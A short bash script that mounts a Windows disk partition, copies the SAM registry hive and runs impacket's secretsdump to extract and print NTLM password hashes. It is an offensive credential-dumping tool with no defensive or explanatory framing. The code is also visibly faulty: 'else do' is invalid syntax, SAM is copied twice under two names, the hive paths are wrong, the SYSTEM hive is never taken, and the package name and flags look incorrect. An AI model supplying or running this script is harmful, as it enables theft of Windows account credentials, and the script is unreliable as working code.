if [ -z "$1" ]; then
part="sda3"
else do
part=$1
fi
echo "dumping hashnt from $part"
sudo mkdir /mnt/$part
sudo mount -o ro /dev/$part /mnt/$part
mkdir win
sudo cp /mnt/$part/Windows/SAM ./win/SAM
sudo cp /mnt/$part/Windows/SAM ./win/SECURITY
sudo apt-get install impacket-secretsdumps -y
sudo impacket-secretsdumps -sam ./win/SAM -security ./win/SECURITY LOCAL -just-dc-ntlm > ./win/hashnt
cat ./win/hashnt
